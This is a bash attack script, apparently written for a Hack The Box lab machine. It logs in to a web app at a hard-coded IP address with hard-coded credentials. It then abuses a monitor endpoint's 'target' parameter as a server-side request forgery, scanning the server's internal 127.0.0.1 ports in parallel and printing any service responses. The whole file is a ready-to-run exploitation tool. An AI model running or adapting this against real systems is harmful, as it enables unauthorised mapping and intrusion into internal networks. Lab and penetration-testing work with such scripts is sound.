#!/bin/bash
export MSYS_NO_PATHCONV=1
COOKIE="/c/HTB/43.200.51.235/http/dast_cookie.txt"
BASE="http://43.200.51.235:8081/ops-status/monitor"
LOGIN="http://43.200.51.235:8081/ops-status/login"

relogin() {
  curl -s -c "$COOKIE" -X POST "$LOGIN" \
    --data-urlencode "username=svc-monitor" --data-urlencode "password=novise" \
    -o /dev/null --max-time 8
}

check_port() {
  port="$1"
  R=$(MSYS_NO_PATHCONV=1 curl -s -G -b "$COOKIE" "$BASE" --data-urlencode "target=127.0.0.1:$port" --data-urlencode "path=/" --max-time 3)
  if echo "$R" | grep -q "Redirecting\|login"; then
    relogin
    R=$(MSYS_NO_PATHCONV=1 curl -s -G -b "$COOKIE" "$BASE" --data-urlencode "target=127.0.0.1:$port" --data-urlencode "path=/" --max-time 3)
  fi
  if [ -z "$R" ]; then return; fi
  if echo "$R" | grep -qi "Connection refused\|timed out\|ConnectTimeoutError"; then return; fi
  MSG=$(echo "$R" | grep -oP '<p class="status-pill status-[a-z]*">\K[^<]*')
  if [ -n "$MSG" ]; then
    printf 'PORT %s :: %s\n' "$port" "$MSG"
  fi
}
export -f check_port relogin
export COOKIE BASE LOGIN

relogin
seq "$1" "$2" | xargs -P 5 -I{} bash -c 'check_port "$@"' _ {}
